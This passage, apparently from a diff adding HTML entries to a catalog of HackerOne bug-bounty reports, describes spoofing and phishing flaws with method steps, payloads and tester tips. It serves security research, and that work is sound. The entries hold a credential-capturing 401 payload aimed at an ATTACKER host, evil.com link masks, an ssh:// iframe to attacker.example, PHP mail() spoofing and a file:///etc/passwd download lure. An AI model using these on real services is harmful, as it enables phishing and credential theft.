+<h4>Root cause</h4><p style="margin:0">The domain had SPF but no DKIM record (and, in the merged cases, SPF using soft ~all/?all instead of -all), allowing forged mail that appears to originate from the domain and passes recipient checks — enabling convincing phishing.</p>
+<h4>Method</h4><ol><li>Query the domain's SPF and DKIM records</li><li>If DKIM absent, or SPF ends in ~all/?all, forged mail is deliverable as the domain</li><li>Send a spoofed From:&lt;security@domain&gt; phishing mail to demonstrate</li></ol>
+<div class="pre">nslookup -querytype=TXT google._domainkey.TARGET 8.8.8.8   # 'No DKIM record'
+dig TXT TARGET | grep spf1   # look for ~all or ?all instead of -all
+# spoof: mail() with From: security@TARGET</div>
+<p class="insight"><b>Insight —</b> Email-auth findings are only worth reporting with a spoofing PoC and impact (phishing/password-reset lure). Check the trio: SPF must end -all (hardfail), DKIM must exist and validate, and DMARC must be p=reject/quarantine — a gap in any one enables spoofing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/84287" target="_blank" rel="noopener">hackerone.com/reports/84287</a></span><a class="src" href="#report-84287" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-481472" style="--sv:var(--sev-low)" data-sev="1" data-votes="362" data-bounty="250">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Link-text vs href mismatch in chat markup (Slack)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#481472</b> · slack · 250 · 362 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Chat/markdown renderers let the displayed link text be set independently of the actual destination; a URL-looking display string can point anywhere. Desktop/mobile clients show no status-bar hover to reveal the real target.</p>
+<h4>Method</h4><ol><li>Send a message via the API with the text field using Slack link markup</li><li>Set display text to a trusted-looking URL and href to attacker domain</li><li>Message renders http://example.com but navigates to evil.com on click</li></ol>
+<div class="pre">POST /api/chat.postMessage HTTP/1.1
+Host: example.slack.com
+...
+Content-Disposition: form-data; name="text"
+
+&lt;http://evil.com|http://example.com&gt;</div>
+<p class="insight"><b>Insight —</b> Any rich-text/markdown/chat surface that supports [text](url) or &lt;url|text&gt; is a link-masking phishing sink; always test whether display text and destination can diverge, and whether the client hides the real URL (mobile/desktop have no hover status bar).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/481472" target="_blank" rel="noopener">hackerone.com/reports/481472</a></span><a class="src" href="#report-481472" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2234420" style="--sv:var(--sev-low)" data-sev="1" data-votes="81" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected text injection by breaking out of an input value attribute</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2234420</b> · khanacademy · none · 81 votes · resolved</div>
+<div class="taxo"><span>Program <b>khanacademy</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Query params (e.g. utm_source/utm_medium) are reflected inside an HTML input value without encoding; injecting "&gt; closes the tag and lets arbitrary attacker text render on the trusted page for phishing/defacement.</p>
+<h4>Method</h4><ol><li>Find a param reflected inside &lt;input value=...&gt; (or reflected in an error page)</li><li>Set the param to "&gt; followed by attacker text/markup</li><li>Load the crafted link -&gt; injected content renders under the trusted origin</li></ol>
+<div class="pre">https://cloud.e.khanacademy.org/districts-demo-form?utm_source="&gt;&lt;h1&gt;Call+1-800-SCAM+to+verify&lt;/h1&gt;</div>
+<p class="insight"><b>Insight —</b> Reflected params inside attributes are worth probing with "&gt; even when full XSS is filtered - text/HTML injection still enables credible phishing on the real domain. If &lt; &gt; survive, escalate toward XSS; if only text renders, it's content spoofing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2234420" target="_blank" rel="noopener">hackerone.com/reports/2234420</a></span><a class="src" href="#report-2234420" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1245051" style="--sv:var(--sev-low)" data-sev="1" data-votes="45" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Content spoofing / text injection reflected on error (404) pages</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1245051</b> · basecamp · 100 · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An application reflects attacker-controlled path/parameter text unencoded into an error or 404 page, letting the attacker present arbitrary messages (maintenance notices, phishing text) under the trusted domain even without script execution.</p>
+<h4>Method</h4><ol><li>Append arbitrary text after the slash / in a nonexistent path</li><li>Confirm the text is reflected verbatim in the error page body</li><li>Craft a plausible social-engineering message pointing users to an attacker resource</li></ol>
+<div class="pre">https://TARGET/.git/!!!ATENTION!%20This%20server%20is%20on%20Maintenance%20please%20go%20to%20WWW.EVIL.COM
+https://TARGET/&lt;any text reflected on 404&gt;</div>
+<p class="insight"><b>Insight —</b> Error/404 pages are a recurring, low-guarded reflection surface: they often echo the requested path and frequently escape normal templating/CSP controls. Always fuzz them for unencoded reflection — useful for phishing text injection and, when a header/CSP is also missing, for XSS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1245051" target="_blank" rel="noopener">hackerone.com/reports/1245051</a></span><a class="src" href="#report-1245051" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-2501378" style="--sv:var(--sev-low)" data-sev="1" data-votes="45" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Browser security-UI URL spoof via improper eliding/reordering of long subdomains</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2501378</b> · brave · 100 · 45 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-android</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A browser security indicator (Shields pop-up) displayed the URL without eliding from the front (and in a variant, reordered numeric labels), so a long attacker subdomain pushed the real registrable domain out of view, letting an attacker-controlled host masquerade as a trusted one.</p>
+<h4>Method</h4><ol><li>Register a long/deceptive subdomain under an attacker domain (e.g. trusted-looking-labels.attacker.com or 1.1.1.1.attacker.com)</li><li>Open it and invoke the browser security-indicator/shields UI</li><li>Observe the displayed host is truncated/reordered to hide the true registrable domain</li></ol>
+<div class="pre">https://long-extended-subdomain-name-containing-many-letters-and-dashes.badssl.com/
+https://1.1.1.1.attacker.com/   # shown as attacker.com.1.1.1.1 in the reordering variant</div>
+<p class="insight"><b>Insight —</b> Audit every place a browser/app renders a URL for trust (omnibox, permission/shield dialogs, wallet/donation prompts). URLs must be elided from the front per Chromium URL-display guidelines; front-truncation or label reordering is a spoofing bug. Check mobile separately — desktop and Android often differ.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2501378" target="_blank" rel="noopener">hackerone.com/reports/2501378</a></span><a class="src" href="#report-2501378" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1128701" style="--sv:var(--sev-low)" data-sev="1" data-votes="33" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Abuse 'share via email' to send phishing from a trusted address</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1128701</b> · security · none · 33 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>graphql</b></span><span>Tag <b>graphql</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A share/notify feature (ShareReportViaEmail) sends attacker-supplied message text to an attacker-chosen recipient from the platform's own verified email address, with no label distinguishing sandbox/user content, so the email looks fully legitimate.</p>
+<h4>Method</h4><ol><li>Create a sandbox program and a fake report/asset</li><li>Call the shareReportViaEmail GraphQL mutation with an attacker message and target email</li><li>Recipient gets a convincing email from HackerOne's verification address containing the social-engineering payload</li></ol>
+<div class="pre">mutation Createvpncredentialsmutation($input0:ShareReportViaEmailInput!){shareReportViaEmail(input:$input0){errors{edges{node{field,message,type}}},was_successful,clientMutationId}}
+variables: {"input0":{"message":"...payout for retest is 500$, reply to attacker@wearehackerone.com...","emails":"VICTIM@wearehackerone.com","report_id":"gid://hackerone/Report/&lt;SANDBOX_ID&gt;","clientMutationId":"0"}}</div>
+<p class="insight"><b>Insight —</b> Any 'email this to a friend / share report / invite' feature that delivers user-controlled text from the platform's trusted domain is a phishing primitive. Test whether sandbox/untrusted content is labeled, and whether arbitrary recipients and message bodies are allowed.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1128701" target="_blank" rel="noopener">hackerone.com/reports/1128701</a></span><a class="src" href="#report-1128701" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-500348" style="--sv:var(--sev-low)" data-sev="1" data-votes="31" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side URL-scheme validation bypass via request tampering (Slack)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#500348</b> · slack · 100 · 31 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Scheme validation on a user-controllable link field (profile custom field) is enforced only client-side. Editing the raw API request injects disallowed schemes (tel:, and potentially other deep-link/custom schemes) that render as clickable links.</p>
+<h4>Method</h4><ol><li>Set a profile custom field with a normal https URL</li><li>Intercept the users.profile.set request</li><li>Replace the value with a disallowed scheme (tel://...)</li><li>Field saves; clicking the link on mobile triggers the scheme (e.g. dials attacker)</li></ol>
+<div class="pre">POST /api/users.profile.set HTTP/1.1
+Host: example-corp.slack.com
+...
+Content-Disposition: form-data; name="profile"
+
+{"real_name":"...","fields":{"XfABVBP467":{"value":"tel://03-9999-0000","alt":"McDonald's"}}}</div>
+<p class="insight"><b>Insight —</b> When a UI blocks certain URL schemes, always retry the raw request: validation is frequently client-side only. Server-accepted tel:/sms:/custom-scheme links become deep-link abuse and social-engineering vectors (javascript:/data: were blocked server-side here).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/500348" target="_blank" rel="noopener">hackerone.com/reports/500348</a></span><a class="src" href="#report-500348" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-221328" style="--sv:var(--sev-low)" data-sev="1" data-votes="30" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>HTTP 401 response injection via unvalidated image_src for credential phishing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#221328</b> · X / xAI · awarded · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>X / xAI</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The image_src parameter loaded images from any arbitrary host without proxying/whitelisting; pointing it at a host that returns HTTP 401 makes the browser display a Basic-Auth prompt that appears to originate from the trusted domain, plus leaks the viewer's IP/browser.</p>
+<h4>Method</h4><ol><li>Find a param that auto-loads a remote image/URL into a trusted page</li><li>Set it to an attacker host that responds with 401 WWW-Authenticate: Basic</li><li>Victim loading the page sees a native credential prompt seemingly from the trusted domain</li><li>Captured credentials are sent to the attacker host; IP/UA also disclosed</li></ol>
+<div class="pre">https://amp.twimg.com/amplify-web-player/prod/source.html?url=n/a&amp;image_src=https://ATTACKER/admin&amp;player_swf_url=https://ATTACKER/admin&amp;page=amplify_card
+# ATTACKER/admin responds: HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm="login"</div>
+<p class="insight"><b>Insight —</b> Unproxied remote-image/URL params enable Basic-Auth phishing (401 injection) and IP/UA disclosure. Whenever a page fetches an attacker-supplied image or subresource cross-origin, test a 401 responder; the browser attributes the prompt to the parent origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/221328" target="_blank" rel="noopener">hackerone.com/reports/221328</a></span><a class="src" href="#report-221328" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-997198" style="--sv:var(--sev-low)" data-sev="1" data-votes="28" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Text/content injection in reflected pages for phishing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#997198</b> · cs_money · awarded · 28 votes · resolved</div>
+<div class="taxo"><span>Program <b>cs_money</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An endpoint reflects attacker-controlled text (from URL path or query parameter) into the page body without a link/HTML, letting an attacker place a convincing phishing/scam message (e.g. 'site has moved, visit X') on the trusted domain.</p>
+<h4>Method</h4><ol><li>Find a page that reflects the URL path or a query parameter into visible text (404/error/support pages are common)</li><li>Insert a phishing message (discount, 'moved to', support instructions) into that reflected value</li><li>Share the trusted-domain URL; victim reads attacker text as official</li></ol>
+<div class="pre">https://support.cs.money//.cs.money(!has-moved-to-[www.support.cs.money.in]).Please-visit__[www.cs.money.in]___present__resource</div>
+<p class="insight"><b>Insight —</b> Test error/support/404 pages for reflected path/param text injection. Even without HTML/link rendering, arbitrary text on a trusted domain is a credible phishing surface; look for parameters echoed into the DOM as plain text.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/997198" target="_blank" rel="noopener">hackerone.com/reports/997198</a></span><a class="src" href="#report-997198" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-474397" style="--sv:var(--sev-low)" data-sev="1" data-votes="19" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Text injection / content spoofing in 404 page</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#474397</b> · cfptime · none · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>cfptime</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 404 error page reflects the requested path verbatim, letting an attacker craft a URL whose reflected text presents a spoofed maintenance/redirect message for phishing.</p>
+<h4>Method</h4><ol><li>Append attacker text as the path segment</li><li>Load the URL and confirm the text is reflected in the 404 body</li><li>Craft a convincing 'maintenance, go to evil.com' message and send the link</li></ol>
+<div class="pre">https://TARGET/!!!ATTENTION!%20This%20server%20is%20on%20Maintenance%20please%20go%20to%20WWW.EVIL.COM</div>
+<p class="insight"><b>Insight —</b> Reflected path/parameter text in error pages is a low-severity but real phishing primitive; if angle brackets are filtered it may still allow plain-text content spoofing. Escalate by checking whether the same sink allows HTML/JS.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/474397" target="_blank" rel="noopener">hackerone.com/reports/474397</a></span><a class="src" href="#report-474397" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-785243" style="--sv:var(--sev-low)" data-sev="1" data-votes="19" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Invisible-unicode bypass of app-name uniqueness -&gt; OAuth consent spoof</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#785243</b> · x · awarded · 19 votes · resolved</div>
+<div class="taxo"><span>Program <b>x</b></span><span>Surface <b>web</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">App-name uniqueness/invisible-character validation blocks some zero-width chars (U+200B) but not others (Mongolian vowel separator U+180E). The char renders invisibly, so an attacker registers an app whose name is visually identical to a trusted app (e.g. 'Twitter Web App'), spoofing the OAuth authorization screen.</p>
+<h4>Method</h4><ol><li>Create a developer app and choose a taken/trusted app name</li><li>Insert U+180E (or another allowed invisible/space char) into the name to pass the uniqueness check</li><li>Register; the name renders identically to the trusted app</li><li>Direct victims through the OAuth consent screen showing the spoofed app name (attacker also controls icon/website/description)</li></ol>
+<div class="pre">appName: Twitter Web App\u180E   # U+180E passes the invisible-char filter, renders as 'Twitter Web App'</div>
+<p class="insight"><b>Insight —</b> Uniqueness/anti-spoofing filters on names usually blocklist a few known invisible codepoints; test the full set (U+180E, other unicode spaces from jkorpela.fi/chars/spaces) to clone trusted identifiers. Highest impact where the name is the only anti-phishing signal (OAuth consent screens).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/785243" target="_blank" rel="noopener">hackerone.com/reports/785243</a></span><a class="src" href="#report-785243" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-268984" style="--sv:var(--sev-low)" data-sev="1" data-votes="15" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>IDN homograph bypass via userinfo (user@host) / /@ in URL</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#268984</b> · brave · awarded · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Tag <b>subdomain-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The browser's IDN-to-punycode safety conversion is applied only to part of the URL; when the URL contains userinfo (user@host) or a /@ construct, the real host is rendered as Unicode homoglyphs instead of xn-- punycode.</p>
+<h4>Method</h4><ol><li>Take a homoglyph domain (e.g. ebаy.com with Cyrillic a -&gt; xn--eby-7cd.com).</li><li>Embed it after an @ or /@ so the parser only punycodes the pre-@ segment: ebаy.com/@brave.com or @ebаy.com.</li><li>Add it as homepage / open it; the address bar shows the deceptive Unicode host.</li></ol>
+<div class="pre">ebаy.com/@brave.com   -&gt; browser navigates to xn--eby-7cd.com while displaying Unicode
+@ebаy.com/            -&gt; renders as ebаy.com (not punycode)</div>
+<p class="insight"><b>Insight —</b> When testing IDN/homograph defenses, don't just try a bare homoglyph host; wrap it in userinfo (user@host), paths, ports, and fragments - parsers frequently normalize/punycode only one segment.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/268984" target="_blank" rel="noopener">hackerone.com/reports/268984</a></span><a class="src" href="#report-268984" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1710564" style="--sv:var(--sev-low)" data-sev="1" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>BIDI/RTL CSS reversing displayed origin (MetaMask)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1710564</b> · metamask · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>metamask</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The UI renders the connected-site origin with CSS direction:rtl to support RTL languages. For domains starting with a digit followed by a hyphen, the Unicode BIDI algorithm reorders characters, so a controlled origin like 0-metamask.io is displayed as metamask.io-0, letting a malicious site masquerade as another origin.</p>
+<h4>Method</h4><ol><li>Register a domain crafted to exploit BIDI reordering (leading digit + hyphen, e.g. 10.18.4-metamask.io)</li><li>Have the victim connect the wallet to that origin</li><li>In Connected Sites, the origin renders reversed to resemble the trusted domain, hiding which site to disconnect</li></ol>
+<div class="pre">origin: 0-metamask.io   # rendered as 'metamask.io-0' under CSS direction: rtl (BIDI reorder)
+# e.g. 10.18.4-metamask.io masquerades as metamask.io with a version-number distractor</div>
+<p class="insight"><b>Insight —</b> Anywhere a hostname/identity is shown under RTL-capable CSS or without BIDI isolation, digit/hyphen/RTL-marker crafted strings reorder on screen. Test origin/username/filename displays with BIDI-sensitive inputs; fix is Unicode BIDI isolation (LTR override) on identity fields.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1710564" target="_blank" rel="noopener">hackerone.com/reports/1710564</a></span><a class="src" href="#report-1710564" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-176929" style="--sv:var(--sev-low)" data-sev="1" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mobile browser address-bar spoofing via repeated port navigation</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#176929</b> · brave · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-ios</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Navigating repeatedly to a trusted URL with a non-standard port (https://google.com:1234) while rendering attacker content causes the mobile browser to display the trusted host in the address bar before the (failing/slow) load resolves, so attacker content appears under a legitimate URL.</p>
+<h4>Method</h4><ol><li>Host a page that document.writes attacker content then sets document.location to https://trusted:1234</li><li>Re-trigger the navigation on a short interval so the trusted URL stays pinned in the address bar</li><li>Victim sees attacker content under the spoofed trusted origin</li></ol>
+<div class="pre">&lt;script&gt;
+function spoof(){
+  document.write('&lt;h1&gt;This is not Google&lt;/h1&gt;');
+  document.location='https://google.com:1234';
+  setInterval(function(){document.location='https://google.com:1234';},9800);
+}
+&lt;/script&gt;
+&lt;input type=button value=Spoof onclick=spoof()&gt;</div>
+<p class="insight"><b>Insight —</b> Address-bar spoofing on mobile browsers often relies on the URL updating before content loads: test slow-loading/non-standard-port URLs and setInterval re-navigation. High-value for phishing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/176929" target="_blank" rel="noopener">hackerone.com/reports/176929</a></span><a class="src" href="#report-176929" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-258710" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>download attribute exfiltrates local files (file://)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#258710</b> · brave · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The browser fails to block the HTML5 download attribute when the href is a file:// URL (unlike Chrome/Firefox), so a web page can trigger a save of a local file with no clear origin indication.</p>
+<h4>Method</h4><ol><li>Host a page with &lt;a href="file:///etc/passwd" download&gt;</li><li>Trick the victim (Linux/local) into clicking</li><li>Local file is downloaded, indistinguishable from a remote download</li></ol>
+<div class="pre">&lt;a href="file:///etc///passwd" download&gt;Download local file&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Test browsers/webviews for cross-scheme download-attribute enforcement; file://, and content:// on mobile, are the interesting sinks for local-file phishing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/258710" target="_blank" rel="noopener">hackerone.com/reports/258710</a></span><a class="src" href="#report-258710" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-369185" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Silent external protocol-handler launch (ssh://, telnet://)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#369185</b> · brave · awarded · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Browser launches OS protocol handlers without naming the target app, without a per-connection confirmation, and without echoing the real host, so an iframe/link can auto-initiate ssh/telnet sessions and spoof the destination.</p>
+<h4>Method</h4><ol><li>Page contains a link or iframe with src="ssh://attacker"</li><li>User (or window.onblur+alert trick) triggers the handler</li><li>Terminal opens and connects with no host confirmation; displayed link text can differ from real host</li></ol>
+<div class="pre">&lt;iframe src="ssh://attacker.example"&gt;&lt;/iframe&gt;
+&lt;a href="ssh://abc.xyz"&gt;Connect to google.com&lt;/a&gt;  &lt;!-- host spoof --&gt;</div>
+<p class="insight"><b>Insight —</b> On desktop apps/webviews, enumerate registered external URL schemes (ssh, telnet, smb, custom app schemes) and test for auto-launch, missing app name, and host spoofing; leaks client IP/username and widens attack surface.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/369185" target="_blank" rel="noopener">hackerone.com/reports/369185</a></span><a class="src" href="#report-369185" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-147919" style="--sv:var(--sev-low)" data-sev="1" data-votes="9" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Email spoofing via missing/misconfigured SPF/DMARC</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#147919</b> · veris · none · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>veris</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The domain lacks an enforcing SPF/DMARC policy, so mail with a forged From: &lt;anything&gt;@target arrives in recipients' inboxes (not spam), enabling phishing that impersonates the organization.</p>
+<h4>Method</h4><ol><li>Check the domain's SPF (v=spf1 ... -all) and DMARC (p=reject/quarantine) records.</li><li>Send a message with From: support@target from an unrelated host/script.</li><li>Confirm it lands in the inbox rather than being rejected/quarantined.</li></ol>
+<div class="pre">&lt;?php
+$to = "attacker@gmail.com";
+$subject = "test";
+$txt = "testing";
+$headers = "From: support@target";
+mail($to,$subject,$txt,$headers);
+?&gt;</div>
+<p class="insight"><b>Insight —</b> Always fingerprint SPF/DMARC/DKIM early; a missing -all or absent p=reject DMARC is a reproducible spoofing/phishing finding. Verify by delivery to a real inbox, not just by record absence.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/147919" target="_blank" rel="noopener">hackerone.com/reports/147919</a></span><a class="src" href="#report-147919" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-25281" style="--sv:var(--sev-low)" data-sev="1" data-votes="9" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Support-process bypass via unauthenticated email spoofing</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#25281</b> · security · 100 · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>other</b></span><span>Chain <b>support confirmation request → spoofed From header → identit</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A support workflow 'verified' a sensitive change (username/profile-link change) by asking the requester to send a confirmation email from the account's address, but did not validate SPF/DMARC, so a spoofed From header satisfied the check and let an attacker change another user's username.</p>
+<h4>Method</h4><ol><li>Request the sensitive change to support from an arbitrary email</li><li>When support asks for confirmation 'from the associated email', spoof that From address using an open relay / spoofing service</li><li>Support accepts the spoofed confirmation and applies the change</li></ol>
+<div class="pre"># spoofed confirmation (e.g. via emkei.cz)
+From: victim@gmail.com
+To: support@target.com
+Subject: Re: confirm username change
+
+OK, please change my username from abc to xyz</div>
+<p class="insight"><b>Insight —</b> Any human/support process that treats an inbound email From address as proof of identity is bypassable unless SPF/DMARC/DKIM is enforced. When testing manual workflows, check whether confirmation relies on spoofable channels (email From, caller-ID, display name).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/25281" target="_blank" rel="noopener">hackerone.com/reports/25281</a></span><a class="src" href="#report-25281" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1819329" style="--sv:var(--sev-low)" data-sev="1" data-votes="9" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Inconsistent IDN/punycode handling across UI surfaces (Brave iOS Shield)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1819329</b> · brave · awarded · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>mobile-ios</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">IDN homograph protection (punycode display) is applied in the address bar but not in a secondary UI surface (the Brave Shield panel), which renders the decoded lookalike unicode domain, letting a homograph domain appear as a legitimate brand.</p>
+<h4>Method</h4><ol><li>Register/serve an IDN homograph domain of a target brand (xn-- punycode)</li><li>Visit it in the browser</li><li>Open the secondary panel (Shield) that lacks IDN protection and shows the spoofed decoded domain</li></ol>
+<div class="pre">https://www.xn--80ak6aa92e.com   # Shield panel displays 'apple.com'</div>
+<p class="insight"><b>Insight —</b> When a client protects against IDN homographs in one place, audit every other surface that shows the hostname (permission panels, connected-sites, share sheets, download prompts). Protection is often applied per-surface, not globally.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1819329" target="_blank" rel="noopener">hackerone.com/reports/1819329</a></span><a class="src" href="#report-1819329" style="color:var(--faint)">#</a></div></article>
+<article class="spec hidden" id="report-1566325" style="--sv:var(--sev-low)" data-sev="1" data-votes="9" data-bounty="300">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Feed API trusts client-supplied author/object identifiers</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1566325</b> · phabricator · 300 · 9 votes · resolved</div>
+<div class="taxo"><span>Program <b>phabricator</b></span><span>Surface <b>api</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Conduit feed.publish API takes authorPHID and objectPHID directly from the request without verifying the caller is that author or can access that object, so an attacker forges feed stories attributed to other users and referencing restricted objects.</p>
+<h4>Method</h4><ol><li>Call feed.publish with type=PhabricatorTokenGivenFeedStory</li><li>Set data.authorPHID to a victim user's PHID (readable from their profile page)</li><li>Set data.objectPHID to any object PHID (harvestable from page HTML), including restricted ones</li><li>Story appears as if the victim acted / as if the attacker can access the restricted object</li></ol>
+<div class="pre">{
+  "authorPHID": "PHID-USER-&lt;victim&gt;",
+  "tokenPHID": "PHID-TOKN-medal-4",
+  "objectPHID": "PHID-TASK-&lt;restricted&gt;"
+}</div>
